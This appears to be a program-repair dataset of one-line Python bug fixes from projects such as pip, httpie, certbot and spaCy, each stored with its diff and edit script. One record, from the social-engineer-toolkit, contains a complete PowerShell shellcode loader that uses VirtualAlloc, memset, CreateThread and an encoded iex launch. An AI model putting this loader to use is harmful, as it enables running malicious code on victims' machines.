{"project": "pip", "commit_sha": "3b0eb9136a374b814ac92fac5f38e7cbb8eb1950", "parent_sha": "b063bc882a4944cbd003a29edcfd0f88b16367ab", "file_path": "tests/unit/test_req.py", "project_url": "https://github.com/takluyver/pip", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -44,7 +44,7 @@ class TestRequirementSet(object):\n         finder = PackageFinder([find_links], [])\n         assert_raises_regexp(\n             PreviousBuildDirError,\n-            \"pip can't proceed with [\\s\\S]*%s[\\s\\S]*%s\" % (req, build_dir),\n+            \"pip can't proceed with [\\s\\S]*%s[\\s\\S]*%s\" % (req, build_dir.replace('\\\\', '\\\\\\\\')),\n             reqset.prepare_files,\n             finder\n             )\n", "before": "assert_raises_regexp ( PreviousBuildDirError , \"pip can't proceed with [\\s\\S]*%s[\\s\\S]*%s\" % ( req , build_dir ) , reqset . prepare_files , finder )", "after": "assert_raises_regexp ( PreviousBuildDirError , \"pip can't proceed with [\\s\\S]*%s[\\s\\S]*%s\" % ( req , build_dir . replace ( '\\\\' , '\\\\\\\\' ) ) , reqset . prepare_files , finder )", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"tuple\", 3, 59, 3, 75], [\"call\", \"N0\"], 3], [\"Insert\", [\"tuple\", 3, 59, 3, 75], [\"):)\", \"T\"], 4], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N2\"], 1], [\"Move\", \"N1\", [\"identifier:build_dir\", 3, 65, 3, 74], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:replace\", \"T\"], 2], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N2\", [\"string:'\\\\\\\\'\", \"T\"], 1], [\"Insert\", \"N2\", [\",:,\", \"T\"], 2], [\"Insert\", \"N2\", [\"string:'\\\\\\\\\\\\\\\\'\", \"T\"], 3], [\"Move\", \"N2\", [\"):)\", 3, 74, 3, 75], 4]]"}
{"project": "httpie", "commit_sha": "5bdf4a3baede7e85dcc529aadb240e895e833f52", "parent_sha": "2d9414d34c5ab8b77de0ab17b208d014a1acf16e", "file_path": "tests/test_docs.py", "project_url": "https://github.com/huainanhai/httpie", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -36,4 +36,4 @@ def test_rst_file_syntax(filename):\n         stdout=subprocess.PIPE\n     )\n     err = p.communicate()[1]\n-    assert p.returncode == 0, err\n+    assert p.returncode == 0, err.decode('utf8')\n", "before": "assert p . returncode == 0 , err", "after": "assert p . returncode == 0 , err . decode ( 'utf8' )", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"assert_statement\", 3, 5, 3, 34], [\"call\", \"N0\"], 3], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N2\"], 1], [\"Move\", \"N1\", [\"identifier:err\", 3, 31, 3, 34], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:decode\", \"T\"], 2], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N2\", [\"string:'utf8'\", \"T\"], 1], [\"Insert\", \"N2\", [\"):)\", \"T\"], 2]]"}
{"project": "sqlmap", "commit_sha": "fdd607585970064d07ba3dc71ab1965f1bfb5a72", "parent_sha": "92ea8841f81e2c7d0e4b08a57a074b0bf5c1badc", "file_path": "lib/core/agent.py", "project_url": "https://github.com/maycon/sqlmap", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -391,7 +391,7 @@ class Agent(object):\n                 elif depth == 0 and char == ',':\n                     commas.append(index)\n             commas = sorted(commas)\n-            fieldsSplitted = [fields[x:y] for (x, y) in zip(commas, commas[1:])]\n+            fieldsSplitted = [fields[x:y].strip(\",\") for (x, y) in zip(commas, commas[1:])]\n             dbmsDelimiter = queries[Backend.getIdentifiedDbms()].delimiter.query\n             nulledCastedFields = []\n \n", "before": "fieldsSplitted = [ fields [ x : y ] for ( x , y ) in zip ( commas , commas [ 1 : ] ) ]", "after": "fieldsSplitted = [ fields [ x : y ] . strip ( \",\" ) for ( x , y ) in zip ( commas , commas [ 1 : ] ) ]", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"list_comprehension\", 3, 30, 3, 81], [\"call\", \"N0\"], 1], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N2\"], 1], [\"Move\", \"N1\", [\"subscript\", 3, 31, 3, 42], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:strip\", \"T\"], 2], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N2\", [\"string:\\\",\\\"\", \"T\"], 1], [\"Insert\", \"N2\", [\"):)\", \"T\"], 2]]"}
{"project": "social-engineer-toolkit", "commit_sha": "67e0ff035f196b815b237d3ebfcbd8ffee52133a", "parent_sha": "0718f45500d65b38a1ab573918ba0255bc754088", "file_path": "src/core/setcore.py", "project_url": "https://github.com/Im-Mr-Chris/social-engineer-toolkit", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -1413,7 +1413,7 @@ def generate_powershell_alphanumeric_payload(payload, ipaddr, port, payload2):\n         r\"\"\"$1 = '$c = ''[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $c -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = %s;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};';$e = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));$2 = \"-enc \";if([IntPtr]::Size -eq 8){$3 = $env:SystemRoot + \"\\syswow64\\WindowsPowerShell\\v1.0\\powershell\";iex \"& $3 $2 $e\"}else{;iex \"& powershell $2 $e\";}\"\"\" % (shellcode))\n \n     # unicode and base64 encode and return it\n-    return base64.b64encode(powershell_command.encode('utf_16_le'))\n+    return base64.b64encode(powershell_command.encode('utf_16_le')).decode(\"ascii\")\n \n # generate base shellcode\n def generate_shellcode(payload, ipaddr, port):\n", "before": "r\"\"\"$1 = '$c = ''[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $c -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = %s;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};';$e = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));$2 = \"-enc \";if([IntPtr]::Size -eq 8){$3 = $env:SystemRoot + \"\\syswow64\\WindowsPowerShell\\v1.0\\powershell\";iex \"& $3 $2 $e\"}else{;iex \"& powershell $2 $e\";}\"\"\" % ( shellcode ) ) return base64 . b64encode ( powershell_command . encode ( 'utf_16_le' ) )", "after": "r\"\"\"$1 = '$c = ''[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $c -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = %s;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};';$e = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));$2 = \"-enc \";if([IntPtr]::Size -eq 8){$3 = $env:SystemRoot + \"\\syswow64\\WindowsPowerShell\\v1.0\\powershell\";iex \"& $3 $2 $e\"}else{;iex \"& powershell $2 $e\";}\"\"\" % ( shellcode ) ) return base64 . b64encode ( powershell_command . encode ( 'utf_16_le' ) ) . decode ( \"ascii\" )", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"call\", 3, 12, 3, 68], [\"attribute\", \"N0\"], 0], [\"Insert\", [\"call\", 3, 12, 3, 68], [\"argument_list\", \"N1\"], 1], [\"Move\", \"N0\", [\"call\", 3, 12, 3, 68], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:decode\", \"T\"], 2], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N1\", [\"string:\\\"ascii\\\"\", \"T\"], 1], [\"Insert\", \"N1\", [\"):)\", \"T\"], 2]]"}
{"project": "enigma2", "commit_sha": "6f454b1e7431f5b2440693fa1dd87cde7fab3c4e", "parent_sha": "1dc3dbfd095fa637ea71bbc4dfefd52055bbe9b4", "file_path": "lib/python/Screens/SoftwareUpdate.py", "project_url": "https://github.com/nx111/enigma2", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -73,7 +73,7 @@ class UpdatePlugin(Screen):\n \t\ttry:\n \t\t\t# TODO: Use Twisted's URL fetcher, urlopen is evil. And it can\n \t\t\t# run in parallel to the package update.\n-\t\t\tif getBoxType() in urlopen(\"http://openpli.org/status\").read():\n+\t\t\tif getBoxType() in urlopen(\"http://openpli.org/status\").read().split(','):\n \t\t\t\tmessage = _(\"The current beta image might not be stable.\\nFor more information see www.openpli.org.\")\n \t\t\t\tpicon = MessageBox.TYPE_ERROR\n \t\t\t\tdefault = False\n", "before": "if getBoxType ( ) in urlopen ( \"http://openpli.org/status\" ) . read ( ) : message = _ ( \"The current beta image might not be stable.\\nFor more information see www.openpli.org.\" ) picon = MessageBox . TYPE_ERROR default = False", "after": "if getBoxType ( ) in urlopen ( \"http://openpli.org/status\" ) . read ( ) . split ( ',' ) : message = _ ( \"The current beta image might not be stable.\\nFor more information see www.openpli.org.\" ) picon = MessageBox . TYPE_ERROR default = False", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"call\", 3, 23, 3, 66], [\"attribute\", \"N0\"], 0], [\"Insert\", [\"call\", 3, 23, 3, 66], [\"argument_list\", \"N1\"], 1], [\"Move\", \"N0\", [\"call\", 3, 23, 3, 66], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:split\", \"T\"], 2], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N1\", [\"string:','\", \"T\"], 1], [\"Insert\", \"N1\", [\"):)\", \"T\"], 2]]"}
{"project": "certbot", "commit_sha": "5b435404522bd0d04047066cb05e4d904432bb0c", "parent_sha": "0da690afb23aa2c4239a7373ae7d9e25d6ddba15", "file_path": "server-ca/CSR.py", "project_url": "https://github.com/barkinet/certbot", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -59,7 +59,7 @@ def pubkey(csr):\n     @return: a string of the PEM-encoded public key\n     \"\"\"\n     req = M2Crypto.X509.load_request_string(csr)\n-    return req.get_pubkey().as_pem(None)\n+    return req.get_pubkey().get_rsa().as_pem(None)\n \n def subject(csr):\n     \"\"\"\n", "before": "return req . get_pubkey ( ) . as_pem ( None )", "after": "return req . get_pubkey ( ) . get_rsa ( ) . as_pem ( None )", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"attribute\", 3, 12, 3, 26], [\"call\", \"N0\"], 0], [\"Insert\", [\"attribute\", 3, 12, 3, 26], [\".:.\", \"T\"], 1], [\"Insert\", [\"attribute\", 3, 12, 3, 26], [\"identifier:get_rsa\", \"T\"], 2], [\"Move\", \"N0\", [\"attribute\", 3, 12, 3, 26], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N1\"], 1], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N1\", [\"):)\", \"T\"], 1]]"}
{"project": "certbot", "commit_sha": "ee622618a2cef70b358477e943dff3e375321d7a", "parent_sha": "b9ce09419f6d3f646f8541fbe40f8f3b0dbb1952", "file_path": "certbot/util.py", "project_url": "https://github.com/barkinet/certbot", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -325,7 +325,7 @@ def get_python_os_info():\n         os_ver = subprocess.Popen(\n             [\"sw_vers\", \"-productVersion\"],\n             stdout=subprocess.PIPE\n-        ).communicate()[0]\n+        ).communicate()[0].rstrip('\\n')\n     elif os_type.startswith('freebsd'):\n         # eg \"9.3-RC3-p1\"\n         os_ver = os_ver.partition(\"-\")[0]\n", "before": "os_ver = subprocess . Popen ( [ \"sw_vers\" , \"-productVersion\" ] , stdout = subprocess . PIPE ) . communicate ( ) [ 0 ]", "after": "os_ver = subprocess . Popen ( [ \"sw_vers\" , \"-productVersion\" ] , stdout = subprocess . PIPE ) . communicate ( ) [ 0 ] . rstrip ( '\\n' )", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"assignment\", 0, 9, 3, 27], [\"call\", \"N0\"], 2], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N2\"], 1], [\"Move\", \"N1\", [\"subscript\", 0, 18, 3, 27], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:rstrip\", \"T\"], 2], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N2\", [\"string:'\\\\n'\", \"T\"], 1], [\"Insert\", \"N2\", [\"):)\", \"T\"], 2]]"}
{"project": "website", "commit_sha": "a1c667803dcbd2dd05244983a6ddb62d6dde37c6", "parent_sha": "929615a053e25b17d920c56e003efd32f6669312", "file_path": "apps/course/views.py", "project_url": "https://github.com/SutCEGoS/website", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -27,7 +27,7 @@ def update_courses_list(request):\n         raise PermissionDenied\n     url = \"http://term.inator.ir/courses/list/38/\"\n     data = urlopen(url)\n-    courses_list = json.loads(data.read())\n+    courses_list = json.loads(data.read().decode('utf-8'))\n     for item in courses_list:\n         grp = item['course_id'].split('-')[-1]\n         exam_time = item['exam_time']\n", "before": "courses_list = json . loads ( data . read ( ) )", "after": "courses_list = json . loads ( data . read ( ) . decode ( 'utf-8' ) )", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"call\", 3, 31, 3, 42], [\"attribute\", \"N0\"], 0], [\"Insert\", [\"call\", 3, 31, 3, 42], [\"argument_list\", \"N1\"], 1], [\"Move\", \"N0\", [\"call\", 3, 31, 3, 42], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:decode\", \"T\"], 2], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N1\", [\"string:'utf-8'\", \"T\"], 1], [\"Insert\", \"N1\", [\"):)\", \"T\"], 2]]"}
{"project": "passhole", "commit_sha": "ee4dfab44d62420bbfe45065abcfdc4a0eff6215", "parent_sha": "0695a0a053e52ec643f8b6c95ee388921069d2a4", "file_path": "passhole/passhole.py", "project_url": "https://github.com/Evidlo/passhole", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -81,7 +81,7 @@ def init_database(args):\n             with open(args.keyfile, 'w') as f:\n                 contents = '<?xml version=\"1.0\" encoding=\"UTF-8\"?><KeyFile><Meta><Version>1.00</Version></Meta><Key><Data>{}</Data></Key></KeyFile>'\n                 log.debug(\"keyfile contents {}\".format(contents))\n-                f.write(contents.format(b64encode(os.urandom(32))))\n+                f.write(contents.format(b64encode(os.urandom(32)).decode()))\n \n         kp = PyKeePass(args.database, password='password')\n         kp.set_credentials(password=password, keyfile=keyfile)\n", "before": "f . write ( contents . format ( b64encode ( os . urandom ( 32 ) ) ) )", "after": "f . write ( contents . format ( b64encode ( os . urandom ( 32 ) ) . decode ( ) ) )", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"call\", 3, 41, 3, 66], [\"attribute\", \"N0\"], 0], [\"Insert\", [\"call\", 3, 41, 3, 66], [\"argument_list\", \"N1\"], 1], [\"Move\", \"N0\", [\"call\", 3, 41, 3, 66], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:decode\", \"T\"], 2], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N1\", [\"):)\", \"T\"], 1]]"}
{"project": "sympy", "commit_sha": "51cd159c5a869755ecfb2b192512239a9f89183e", "parent_sha": "09728d7d7fc6c3ca3f518a2d48814ddb41bc7295", "file_path": "sympy/solvers/diophantine.py", "project_url": "https://github.com/sampadsaha5/sympy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -14,7 +14,7 @@ def diophantine(eq, param=symbols(\"t\", Integer=True)):\n-    var = list(eq.free_symbols)\n+    var = list(eq.expand(force=True).free_symbols)\n     var.sort()\n \n     terms = factor(eq).as_ordered_factors()\n", "before": "var = list ( eq . free_symbols )", "after": "var = list ( eq . expand ( force = True ) . free_symbols )", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"attribute\", 0, 16, 0, 31], [\"call\", \"N0\"], 0], [\"Insert\", [\"attribute\", 0, 16, 0, 31], [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N2\"], 1], [\"Move\", \"N1\", [\"identifier:eq\", 0, 16, 0, 18], 0], [\"Move\", \"N1\", [\".:.\", 0, 18, 0, 19], 1], [\"Insert\", \"N1\", [\"identifier:expand\", \"T\"], 2], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N2\", [\"keyword_argument\", \"N3\"], 1], [\"Insert\", \"N2\", [\"):)\", \"T\"], 2], [\"Insert\", \"N3\", [\"identifier:force\", \"T\"], 0], [\"Insert\", \"N3\", [\"=:=\", \"T\"], 1], [\"Insert\", \"N3\", [\"true:True\", \"T\"], 2]]"}
{"project": "OoT-Randomizer", "commit_sha": "0a51b377851aced32a01cce26a7cf776732323b6", "parent_sha": "a442b696c0dad14e11c4d6391eadaca7aabb0d19", "file_path": "Rom.py", "project_url": "https://github.com/TestRunnerSRL/OoT-Randomizer", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -81,7 +81,7 @@ class Rom(BigStream):\n         if romCRC not in validCRC:\n             # Bad CRC validation\n             raise RuntimeError('ROM file %s is not a valid OoT 1.0 US ROM.' % file)\n-        elif len(self.buffer) < 0x2000000 or len(self.buffer) > (0x4000000) or file_name[1] not in ['.z64', '.n64']:\n+        elif len(self.buffer) < 0x2000000 or len(self.buffer) > (0x4000000) or file_name[1].lower() not in ['.z64', '.n64']:\n             # ROM is too big, or too small, or not a bad type\n             raise RuntimeError('ROM file %s is not a valid OoT 1.0 US ROM.' % file)\n         elif len(self.buffer) == 0x2000000:\n", "before": "if romCRC not in validCRC : raise RuntimeError ( 'ROM file %s is not a valid OoT 1.0 US ROM.' % file ) elif len ( self . buffer ) < 0x2000000 or len ( self . buffer ) > ( 0x4000000 ) or file_name [ 1 ] not in [ '.z64' , '.n64' ] : raise RuntimeError ( 'ROM file %s is not a valid OoT 1.0 US ROM.' % file ) elif len ( self . buffer ) == 0x2000000 : ", "after": "if romCRC not in validCRC : raise RuntimeError ( 'ROM file %s is not a valid OoT 1.0 US ROM.' % file ) elif len ( self . buffer ) < 0x2000000 or len ( self . buffer ) > ( 0x4000000 ) or file_name [ 1 ] . lower ( ) not in [ '.z64' , '.n64' ] : raise RuntimeError ( 'ROM file %s is not a valid OoT 1.0 US ROM.' % file ) elif len ( self . buffer ) == 0x2000000 : ", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"comparison_operator\", 3, 80, 3, 116], [\"call\", \"N0\"], 0], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N2\"], 1], [\"Move\", \"N1\", [\"subscript\", 3, 80, 3, 92], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:lower\", \"T\"], 2], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N2\", [\"):)\", \"T\"], 1]]"}
{"project": "mercury", "commit_sha": "7e9ab1d71c65e686152d0139c75dad28a1174a23", "parent_sha": "5b37c73917d6302d8700c72c6d47d8501e1b875b", "file_path": "fab/pantheon/pantheon.py", "project_url": "https://github.com/pantheon-deprecated/mercury", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -202,7 +202,7 @@ def log_drush_backend(data, log=None, context={}):\n     no_dupe = set()\n     for entry in data['log']:\n         # message is already used by a records namespace\n-        context['drush_message'] = str(entry['message'])\n+        context['drush_message'] = str(entry['message'].encode('utf-8'))\n         del entry['message']\n         if 'command' not in context:\n             m = p1.match(context['drush_message'])\n", "before": "context [ 'drush_message' ] = str ( entry [ 'message' ] )", "after": "context [ 'drush_message' ] = str ( entry [ 'message' ] . encode ( 'utf-8' ) )", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 39, 3, 57], [\"call\", \"N0\"], 1], [\"Insert\", [\"argument_list\", 3, 39, 3, 57], [\"):)\", \"T\"], 2], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N2\"], 1], [\"Move\", \"N1\", [\"subscript\", 3, 40, 3, 56], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:encode\", \"T\"], 2], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N2\", [\"string:'utf-8'\", \"T\"], 1], [\"Move\", \"N2\", [\"):)\", 3, 56, 3, 57], 2]]"}
{"project": "push", "commit_sha": "73256162f5f0cd507e6ccdcd8cf55a748aa294c3", "parent_sha": "b54b9a91a5ccdba494fccca26cfb1bbacc05e7d2", "file_path": "push/args.py", "project_url": "https://github.com/reddit-archive/push", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -237,7 +237,7 @@ def build_command_line(config, args):\n \n         components.extend(command)\n \n-    for repo, rev in args.revisions:\n+    for repo, rev in args.revisions.iteritems():\n         components.extend((\"-rev\", repo, rev))\n \n     if not args.build_static:\n", "before": "for repo , rev in args . revisions : components . extend ( ( \"-rev\" , repo , rev ) )", "after": "for repo , rev in args . revisions . iteritems ( ) : components . extend ( ( \"-rev\" , repo , rev ) )", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"for_statement\", 3, 5, 4, 47], [\"call\", \"N0\"], 3], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N2\"], 1], [\"Move\", \"N1\", [\"attribute\", 3, 22, 3, 36], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:iteritems\", \"T\"], 2], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N2\", [\"):)\", \"T\"], 1]]"}
{"project": "mollyproject", "commit_sha": "abdafa6b655dca1e1a54afb672f05812dc51cdbc", "parent_sha": "3625b7644cfefc2fefdfe2eda8f0e59b3e447bad", "file_path": "tags/0.2/mobile_portal/mobile_portal/oxpoints/models.py", "project_url": "https://github.com/mollyproject/mollyproject", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -77,7 +77,7 @@ class Entity(models.Model):\n \n     @property\n     def display_id(self):\n-        return getattr(self, self.entity_type.id_field)\n+        return getattr(self, self.entity_type.id_field).strip()\n         \n class PostCode(models.Model):\n     post_code = models.CharField(max_length=8)\n", "before": "return getattr ( self , self . entity_type . id_field )", "after": "return getattr ( self , self . entity_type . id_field ) . strip ( )", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"call\", 3, 16, 3, 56], [\"attribute\", \"N0\"], 0], [\"Insert\", [\"call\", 3, 16, 3, 56], [\"argument_list\", \"N1\"], 1], [\"Move\", \"N0\", [\"call\", 3, 16, 3, 56], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:strip\", \"T\"], 2], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N1\", [\"):)\", \"T\"], 1]]"}
{"project": "spaCy", "commit_sha": "99982684b0f6588436b1118d7e2978a99c6fac02", "parent_sha": "67ade63fc4462e5c758c403afa5e58f7a5c6b1cd", "file_path": "spacy/compat.py", "project_url": "https://github.com/connorbrinton/spaCy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -79,7 +79,7 @@ def is_config(python2=None, python3=None, windows=None, linux=None, osx=None):\n def normalize_string_keys(old):\n     '''Given a dictionary, make sure keys are unicode strings, not bytes.'''\n     new = {}\n-    for key, value in old:\n+    for key, value in old.items():\n         if isinstance(key, bytes_):\n             new[key.decode('utf8')] = value\n         else:\n", "before": "for key , value in old : if isinstance ( key , bytes_ ) : new [ key . decode ( 'utf8' ) ] = value else : ", "after": "for key , value in old . items ( ) : if isinstance ( key , bytes_ ) : new [ key . decode ( 'utf8' ) ] = value else : ", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"for_statement\", 3, 5, 6, 14], [\"call\", \"N0\"], 3], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N2\"], 1], [\"Move\", \"N1\", [\"identifier:old\", 3, 23, 3, 26], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:items\", \"T\"], 2], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N2\", [\"):)\", \"T\"], 1]]"}
{"project": "spaCy", "commit_sha": "fb6f6f584e574fb21df717f302b2ec9e1d83d6d0", "parent_sha": "bfa8e11ffa58de91393d1ba398c12f7a600b8d48", "file_path": "spacy/cli/_util.py", "project_url": "https://github.com/connorbrinton/spaCy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -53,7 +53,7 @@ def parse_config_overrides(args: List[str]) -> Dict[str, Any]:\n         opt = args.pop(0)\n         err = f\"Invalid config override '{opt}'\"\n         if opt.startswith(\"--\"):  # new argument\n-            opt = opt.replace(\"--\", \"\")\n+            opt = opt.replace(\"--\", \"\").replace(\"-\", \"_\")\n             if \".\" not in opt:\n                 msg.fail(f\"{err}: can't override top-level section\", exits=1)\n             if not args or args[0].startswith(\"--\"):  # flag with no value\n", "before": "opt = opt . replace ( \"--\" , \"\" )", "after": "opt = opt . replace ( \"--\" , \"\" ) . replace ( \"-\" , \"_\" )", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"call\", 3, 19, 3, 40], [\"attribute\", \"N0\"], 0], [\"Insert\", [\"call\", 3, 19, 3, 40], [\"argument_list\", \"N1\"], 1], [\"Move\", \"N0\", [\"call\", 3, 19, 3, 40], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:replace\", \"T\"], 2], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N1\", [\"string:\\\"-\\\"\", \"T\"], 1], [\"Insert\", \"N1\", [\",:,\", \"T\"], 2], [\"Insert\", \"N1\", [\"string:\\\"_\\\"\", \"T\"], 3], [\"Insert\", \"N1\", [\"):)\", \"T\"], 4]]"}
